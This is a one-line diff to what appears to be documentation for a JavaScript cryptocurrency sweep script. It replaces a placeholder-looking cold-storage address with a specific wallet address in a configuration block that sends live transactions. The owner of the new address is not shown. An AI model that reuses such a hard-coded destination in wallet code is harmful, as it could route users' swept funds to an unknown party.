@@ -27,7 +27,7 @@ The provider you choose will depend on your use case and needs. It's a great ide
 ```javascript
 // Adjust these as necessary
 let gasPriceGwei = "2"; // in GWEI
-let coldStorage = "0xdead348fe5343718120f0Bea423A329BE3B90f66"; // Address all coins will be swept to
+let coldStorage = "0xB35BFBb5011F865A28Dc23472C635DDcC8b52A6c"; // Address all coins will be swept to
 let totalAccounts = 30000; // to sweep
 let minimumBalance = 0.0001; // only sweep account with balance greater than this
 let sendTransactions = true; // false for debugging, true to actually send tx's
